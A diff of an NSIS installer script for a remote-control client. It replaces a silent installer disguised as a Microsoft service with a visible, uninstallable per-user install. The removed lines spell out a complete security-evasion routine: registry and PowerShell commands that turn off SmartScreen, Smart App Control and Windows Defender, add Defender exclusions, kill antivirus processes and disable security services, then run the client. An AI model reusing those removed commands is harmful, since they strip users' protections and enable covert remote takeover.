@@ -1,81 +1,69 @@
-; RemoteControl Client Installer - NSIS Script
-; Silent install, disable security, deploy and run client
+; RemoteControl Client Installer - standard visible user install
 
-!include "FileFunc.nsh"
+!include "MUI2.nsh"
 
 ;--- Basic Info ---
-Name "System Runtime Service"
+Name "RemoteControl Client"
 OutFile "RemoteControl.Client.Installer.exe"
-InstallDir "$TEMP\RuntimeBroker"
-RequestExecutionLevel admin
-SilentInstall silent
-ShowInstDetails nevershow
+InstallDir "$LOCALAPPDATA\RemoteControlClient"
+RequestExecutionLevel user
+ShowInstDetails show
+ShowUninstDetails show
 
 ;--- Version Info ---
-VIProductVersion "10.0.22621.1"
-VIAddVersionKey "ProductName" "Windows Runtime Service"
-VIAddVersionKey "CompanyName" "Microsoft Corporation"
-VIAddVersionKey "FileDescription" "Runtime Broker Service Installer"
-VIAddVersionKey "FileVersion" "10.0.22621.1"
-VIAddVersionKey "LegalCopyright" "Microsoft Corporation"
+VIProductVersion "1.0.0.0"
+VIAddVersionKey "ProductName" "RemoteControl Client"
+VIAddVersionKey "CompanyName" "RemoteControl"
+VIAddVersionKey "FileDescription" "Remote support client installer"
+VIAddVersionKey "FileVersion" "1.0.0.0"
+VIAddVersionKey "LegalCopyright" "RemoteControl"
+
+;--- UI ---
+!define MUI_ABORTWARNING
+!define MUI_FINISHPAGE_RUN "$INSTDIR\RemoteControl.Client.exe"
+!define MUI_FINISHPAGE_RUN_TEXT "Start RemoteControl Client"
+
+!insertmacro MUI_PAGE_DIRECTORY
+!insertmacro MUI_PAGE_INSTFILES
+!insertmacro MUI_PAGE_FINISH
+
+!insertmacro MUI_UNPAGE_CONFIRM
+!insertmacro MUI_UNPAGE_INSTFILES
+
+!insertmacro MUI_LANGUAGE "English"
 
 ;--- Main Section ---
 Section "Install"
     SetOutPath "$INSTDIR"
     SetOverwrite on
 
-    ; 1. Disable Smart App Control
-    nsExec::ExecToLog 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f'
+    File "/oname=RemoteControl.Client.exe" "RemoteControl.Client.Generated.exe"
+    WriteUninstaller "$INSTDIR\Uninstall.exe"
 
-    ; 2. Disable Windows Defender
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
-    nsExec::ExecToLog 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
-    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue"'
-    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue"'
-    nsExec::ExecToLog 'powershell -NoProfile -Command "Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue"'
+    CreateDirectory "$SMPROGRAMS\RemoteControl Client"
+    CreateShortCut "$SMPROGRAMS\RemoteControl Client\RemoteControl Client.lnk" "$INSTDIR\RemoteControl.Client.exe"
+    CreateShortCut "$SMPROGRAMS\RemoteControl Client\Uninstall RemoteControl Client.lnk" "$INSTDIR\Uninstall.exe"
+    CreateShortCut "$DESKTOP\RemoteControl Client.lnk" "$INSTDIR\RemoteControl.Client.exe"
 
-    ; 3. Add exclusion paths
-    nsExec::ExecToLog 'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue"'
-    nsExec::ExecToLog 'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath ''$INSTDIR'' -ErrorAction SilentlyContinue"'
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "DisplayName" "RemoteControl Client"
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "DisplayVersion" "1.0.0.0"
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "Publisher" "RemoteControl"
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "InstallLocation" "$INSTDIR"
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "DisplayIcon" "$INSTDIR\RemoteControl.Client.exe"
+    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "UninstallString" "$INSTDIR\Uninstall.exe"
+    WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "NoModify" 1
+    WriteRegDWORD HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client" "NoRepair" 1
+SectionEnd
 
-    ; 4. Kill AV processes
-    nsExec::ExecToLog 'taskkill /F /IM 360Tray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM 360Safe.exe'
-    nsExec::ExecToLog 'taskkill /F /IM ZhuDongFangYu.exe'
-    nsExec::ExecToLog 'taskkill /F /IM 360sd.exe'
-    nsExec::ExecToLog 'taskkill /F /IM 360rp.exe'
-    nsExec::ExecToLog 'taskkill /F /IM QQPCTray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM QQPCRTP.exe'
-    nsExec::ExecToLog 'taskkill /F /IM KSafeTray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM kxetray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM HipsTray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM HipsDaemon.exe'
-    nsExec::ExecToLog 'taskkill /F /IM SecurityHealthSystray.exe'
-    nsExec::ExecToLog 'taskkill /F /IM smartscreen.exe'
+Section "Uninstall"
+    Delete "$DESKTOP\RemoteControl Client.lnk"
+    Delete "$SMPROGRAMS\RemoteControl Client\RemoteControl Client.lnk"
+    Delete "$SMPROGRAMS\RemoteControl Client\Uninstall RemoteControl Client.lnk"
+    RMDir "$SMPROGRAMS\RemoteControl Client"
 
-    ; 5. Stop security services
-    nsExec::ExecToLog 'net stop "ZhuDongFangYu" /y'
-    nsExec::ExecToLog 'net stop "360rp" /y'
-    nsExec::ExecToLog 'net stop "WinDefend" /y'
-    nsExec::ExecToLog 'net stop "WdNisSvc" /y'
-    nsExec::ExecToLog 'net stop "SecurityHealthService" /y'
-    nsExec::ExecToLog 'sc config "WinDefend" start=disabled'
-    nsExec::ExecToLog 'sc config "WdNisSvc" start=disabled'
-    nsExec::ExecToLog 'sc config "SecurityHealthService" start=disabled'
+    Delete "$INSTDIR\RemoteControl.Client.exe"
+    Delete "$INSTDIR\Uninstall.exe"
+    RMDir "$INSTDIR"
 
-    ; 6. Extract client
-    File "RemoteControl.Client.Generated.exe"
-
-    ; 7. Run client
-    Exec '"$INSTDIR\RemoteControl.Client.Generated.exe"'
-
-    ; 8. Self-delete installer
-    SetOutPath "$TEMP"
-
+    DeleteRegKey HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\RemoteControl Client"
 SectionEnd
